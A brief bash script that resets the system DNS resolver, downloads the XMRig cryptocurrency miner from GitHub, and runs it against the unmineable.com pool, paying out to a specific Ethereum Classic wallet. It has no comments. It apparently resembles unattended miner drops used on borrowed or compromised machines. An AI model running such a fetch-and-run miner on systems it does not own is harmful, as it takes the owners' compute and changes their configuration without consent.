#!/bin/bash
echo "nameserver 8.8.8.8" > /etc/resolv.conf
wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz 
tar xvzf xmrig-6.16.0-linux-x64.tar.gz 
xmrig-6.16.0/xmrig -t 3 -o rx.unmineable.com:3333 -a rx -k -u ETC:0x03a88d3efc4266081eff9c87bab15e05e59a8f5f.pekerja2 -p x pause
